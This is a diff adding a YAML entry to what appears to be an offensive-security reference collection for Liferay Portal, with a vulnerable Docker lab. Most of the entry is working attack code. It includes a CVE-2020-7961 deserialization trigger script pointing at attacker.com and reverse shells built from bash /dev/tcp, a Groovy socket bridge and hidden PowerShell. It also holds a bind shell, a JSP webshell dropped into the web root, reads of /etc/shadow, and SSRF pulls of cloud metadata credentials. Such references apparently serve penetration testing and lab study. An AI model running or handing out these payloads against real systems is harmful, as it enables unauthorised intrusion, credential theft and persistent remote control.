@@ -1,0 +1,306 @@
+---
+comment: |
+  Liferay Portal is a Java-based enterprise CMS and portal platform.
+
+  CVE-2020-7961 (CVSS 9.8, CISA KEV): Unauthenticated RCE via Java deserialization in the
+  `/api/jsonws` endpoint. Liferay's JSON Web Services API deserializes user-supplied data
+  without validation when invoking the `DDMDataProviderInstance` service. The `invokerURL`
+  parameter is passed to an unmarshaller that performs a JNDI lookup, triggering
+  deserialization of attacker-controlled data via the c3p0
+  `com.mchange.v2.c3p0.WrapperConnectionPoolDataSource` gadget chain. A successful exploit
+  executes arbitrary code as the Liferay process user. Affects Liferay Portal 6.1.0 through
+  7.2.1 GA2. Fixed in 7.2.1 CE GA2 and DXP fix packs.
+  nuclei: CVE-2020-7961
+  ExploitDB: 50/50070
+
+  Admin RCE via Groovy script console: Liferay Portal exposes a server-side scripting
+  console at /group/control_panel/manage/-/server/script for server administrators.
+  Arbitrary Groovy code executes inside the JVM as the Liferay process user.
+docker:
+  compose: "services:\n  liferay:\n    image: liferay/portal:7.2.1-ga2\n    ports:\n\
+    \      - \"8080:8080\"\n    environment:\n      LIFERAY_SETUP_PERIOD_WIZARD_PERIOD_ENABLED:\
+    \ \"false\"\n      LIFERAY_TERMS_PERIOD_OF_PERIOD_USE_PERIOD_REQUIRED: \"false\"\
+    \n      LIFERAY_USERS_PERIOD_REMINDER_PERIOD_QUERIES_PERIOD_ENABLED: \"false\"\
+    \n"
+  note: 'Starts Liferay Portal 7.2.1 GA2 (vulnerable to CVE-2020-7961 unauthenticated
+
+    deserialization RCE). Startup takes approximately 3 minutes.
+
+    Access at `http://localhost:8080`. Default admin credentials: test@liferay.com
+    / test.
+
+    The Groovy script console is at:
+
+    /group/control_panel/manage/-/server/script
+
+    after logging in as admin.
+
+    '
+functions:
+  bind-shell:
+  - code: |
+      // Groovy script console: bind shell on TCP 12345
+      // Submit at: /group/control_panel/manage/-/server/script
+      ServerSocket server = new ServerSocket(12345)
+      Socket client = server.accept()
+      Process p = new ProcessBuilder("/bin/sh").redirectErrorStream(true).start()
+      InputStream ci = client.getInputStream()
+      OutputStream co = client.getOutputStream()
+      InputStream pi = p.getInputStream()
+      OutputStream po = p.getOutputStream()
+      while (!client.isClosed()) {
+          while (pi.available() > 0) co.write(pi.read())
+          while (ci.available() > 0) po.write(ci.read())
+          co.flush()
+          po.flush()
+          Thread.sleep(50)
+      }
+      p.destroy()
+      server.close()
+    comment: |
+      Groovy script console opens a TCP bind shell on port 12345 bridged to /bin/sh.
+      The HTTP request to the script console hangs while the bind shell is active.
+      Connect from the attacker with: nc victim.com 12345
+    connector: tcp-client
+    contexts:
+      admin:
+      console:
+    platform: linux
+    tty: false
+  file-read:
+  - code: |
+      // Groovy script console: read an arbitrary file
+      println new File("/etc/passwd").text
+    comment: |
+      Reads an arbitrary server-side file via the Groovy script console.
+      Useful for extracting database credentials from
+      /opt/liferay/data/portal-setup-wizard.properties or
+      /opt/liferay/tomcat-*/webapps/ROOT/WEB-INF/classes/portal-ext.properties.
+    contexts:
+      admin:
+      console:
+  file-write:
+  - code: |
+      // Groovy script console: write arbitrary content to the filesystem
+      new File("/opt/liferay/tomcat-9.0.17/webapps/ROOT/shell.jsp").text = \
+          '<%@ page import="java.io.*" %><%String c=request.getParameter("c");if(c!=null){String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);out.print(new String(p.getInputStream().readAllBytes()));}%>'
+    comment: |
+      Writes arbitrary content to the filesystem via the Groovy script console.
+      The example drops a JSP webshell into the Liferay Tomcat web root.
+      Adjust the path for the exact Tomcat version in use (check /opt/liferay/).
+      Access the shell at: http://victim.com:8080/shell.jsp?c=id
+    contexts:
+      admin:
+      console:
+  rce:
+  - code: |
+      # CVE-2020-7961: unauthenticated RCE via JSONWS deserialization
+      # Requires: ysoserial (https://github.com/frohoff/ysoserial) and
+      #           a JNDI exploit server (e.g., marshalsec or JNDI-Exploit-Kit)
+      # 1. Start a JNDI exploit server pointing to a remote class that runs the command:
+      #    java -cp marshalsec.jar marshalsec.jndi.RMIRefServer "http://attacker.com/evil/#Exploit" 1099
+      # 2. Send the deserialization trigger:
+      python3 - <<'EOF'
+      import requests
+
+      TARGET = "http://victim.com:8080"
+      JNDI   = "rmi://attacker.com:1099/Exploit"
+
+      # The invokerURL parameter causes Liferay to perform a JNDI lookup
+      # which deserializes the response via c3p0 WrapperConnectionPoolDataSource
+      r = requests.post(
+          TARGET + "/api/jsonws/invoke",
+          data={
+              "cmd": '{"$invokerURL":"' + JNDI + '"}',
+              "/api/jsonws/invoke": "",
+          },
+      )
+      print(r.status_code, r.text[:200])
+      EOF
+    comment: |
+      CVE-2020-7961: Liferay's JSONWS API passes the invokerURL value to a c3p0
+      WrapperConnectionPoolDataSource, triggering a JNDI lookup that deserializes
+      the remote class. The deserialized payload executes as the Liferay process user.
+      Pair with marshalsec or JNDI-Exploit-Kit to serve the malicious class.
+      nuclei: CVE-2020-7961
+      ExploitDB: 50070
+      Metasploit: exploit/multi/misc/liferay_java_deserialization
+    contexts:
+      unauthenticated:
+    version: |
+      6.1.0 - 7.2.1 GA2 (before 7.2.1 CE GA2 / DXP fix packs)
+  - code: |
+      // Groovy script console: execute OS command and return output
+      // Submit at: /group/control_panel/manage/-/server/script
+      def cmd = ["id"].execute()
+      cmd.waitFor()
+      println cmd.text
+    comment: |
+      Liferay Portal's server-side Groovy script console executes arbitrary JVM code
+      as the Liferay process user. Access requires the Administrator role.
+      Use a List form for commands with arguments:
+        ["/bin/sh", "-c", "cat /etc/shadow"].execute()
+    contexts:
+      admin:
+      console:
+    platform: linux
+  reverse-shell:
+  - blind: true
+    code: |
+      # CVE-2020-7961: reverse shell via JSONWS deserialization (Linux)
+      # The JNDI class served by the exploit server executes the reverse shell payload.
+      # Serve a compiled Java class via HTTP whose static initialiser runs:
+      #   Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",
+      #     "bash -i >& /dev/tcp/attacker.com/12345 0>&1"});
+      # Then trigger the deserialization:
+      python3 - <<'EOF'
+      import requests
+
+      TARGET = "http://victim.com:8080"
+      JNDI   = "rmi://attacker.com:1099/Exploit"
+
+      requests.post(
+          TARGET + "/api/jsonws/invoke",
+          data={
+              "cmd": '{"$invokerURL":"' + JNDI + '"}',
+              "/api/jsonws/invoke": "",
+          },
+      )
+      print("[*] Payload sent - check listener")
+      EOF
+    comment: |
+      CVE-2020-7961: the JNDI-loaded class executes the bash reverse shell in its
+      static initialiser. The HTTP response returns before the shell connects.
+      nuclei: CVE-2020-7961
+    contexts:
+      unauthenticated:
+    listener: tcp-server
+    platform: linux
+    tty: false
+    version: |
+      6.1.0 - 7.2.1 GA2 (before 7.2.1 CE GA2 / DXP fix packs)
+  - blind: true
+    code: |
+      // Groovy script console: reverse bash shell (Linux)
+      // Submit at: /group/control_panel/manage/-/server/script
+      String host = "attacker.com"
+      int port = 12345
+      Process p = new ProcessBuilder("/bin/bash").redirectErrorStream(true).start()
+      Socket s = new Socket(host, port)
+      InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
+      OutputStream po = p.getOutputStream(), so = s.getOutputStream()
+      while (!s.isClosed()) {
+          while (pi.available() > 0) so.write(pi.read())
+          while (pe.available() > 0) so.write(pe.read())
+          while (si.available() > 0) po.write(si.read())
+          so.flush()
+          po.flush()
+          Thread.sleep(50)
+      }
+      p.destroy()
+      s.close()
+    comment: |
+      Groovy script console bridges a raw TCP socket to a spawned /bin/bash process.
+      The script console HTTP request hangs while the shell is active.
+      Shell output goes to the attacker's listener, not the HTTP response.
+    contexts:
+      admin:
+      console:
+    listener: tcp-server
+    platform: linux
+    tty: false
+  - blind: true
+    code: |
+      // Groovy script console: PowerShell reverse shell (Windows)
+      String host = "attacker.com"
+      int port = 12345
+      String ps = '$c=New-Object Net.Sockets.TCPClient("' + host + '",' + port + ');' +
+          '$s=$c.GetStream();[byte[]]$b=0..65535|%{0};' +
+          'while(($i=$s.Read($b,0,$b.Length)) -ne 0){' +
+          '$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);' +
+          '$r=(iex $d 2>&1|Out-String);' +
+          '$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}'
+      ["powershell", "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", ps].execute()
+    comment: |
+      Windows variant - spawns a PowerShell reverse shell from the Groovy script console.
+      The Groovy execute() call is fire-and-forget; check the listener for the connection.
+    contexts:
+      admin:
+      console:
+    listener: tcp-server
+    platform: windows
+    tty: false
+  ssrf:
+  - code: |
+      // Groovy script console: probe internal services via java.net.URL
+      println new URL("http://169.254.169.254/latest/meta-data/iam/security-credentials/").text
+
+      // GCP metadata (requires Metadata-Flavor header):
+      println new URL("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")
+          .openConnection().with {
+              setRequestProperty("Metadata-Flavor", "Google")
+              inputStream.text
+          }
+
+      // Probe internal host:
+      println new URL("http://10.0.0.1:8080/").text
+    comment: |
+      The Groovy script console can make outbound HTTP requests via java.net.URL, reaching
+      internal services and cloud metadata endpoints unreachable from the attacker.
+      The full response body is returned inline in the console output.
+    contexts:
+      admin:
+      console:
+  - code: |
+      # CVE-2020-7961: SSRF via JNDI lookup triggered by JSONWS deserialization
+      # The invokerURL parameter causes Liferay to make an outbound connection to the
+      # attacker-specified host:port as part of the JNDI lookup sequence.
+      # This can be used to probe internal services (port scan via timing/errors)
+      # or to exfiltrate data via DNS lookups.
+      python3 - <<'EOF'
+      import requests
+
+      TARGET       = "http://victim.com:8080"
+      INTERNAL_URL = "rmi://internal-host:1099/probe"
+
+      r = requests.post(
+          TARGET + "/api/jsonws/invoke",
+          data={
+              "cmd": '{"$invokerURL":"' + INTERNAL_URL + '"}',
+              "/api/jsonws/invoke": "",
+          },
+      )
+      # Connection refused vs timeout distinguishes open vs closed ports
+      print(r.status_code, r.text[:300])
+      EOF
+    comment: |
+      CVE-2020-7961: the invokerURL parameter triggers an outbound JNDI/RMI connection
+      from the Liferay host to the specified address. Use to probe internal network
+      topology or reach services that are not externally accessible.
+      Connection refused vs timeout differentiates open from closed ports.
+    contexts:
+      unauthenticated:
+    version: |
+      6.1.0 - 7.2.1 GA2 (before 7.2.1 CE GA2 / DXP fix packs)
+  webshell:
+  - code: |
+      // Groovy script console: write a JSP webshell to the Liferay Tomcat web root
+      // Submit at: /group/control_panel/manage/-/server/script
+      // Adjust the Tomcat version in the path to match the target (ls /opt/liferay/)
+      String shellPath = "/opt/liferay/tomcat-9.0.17/webapps/ROOT/shell.jsp"
+      String shellCode = '<%@ page import="java.io.*" %>' +
+          '<%String c=request.getParameter("c");if(c!=null){' +
+          'String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);' +
+          'out.print(new String(p.getInputStream().readAllBytes()));' +
+          '}%>'
+      new File(shellPath).text = shellCode
+      println "[*] Webshell written to: " + shellPath
+    comment: |
+      Writes a JSP webshell to the Liferay Tomcat web root via the Groovy script console.
+      The JSP is served directly by Tomcat. Confirm the exact Tomcat version directory
+      under /opt/liferay/ before running.
+      Access at: http://victim.com:8080/shell.jsp?c=id
+    contexts:
+      admin:
+      console:
+...
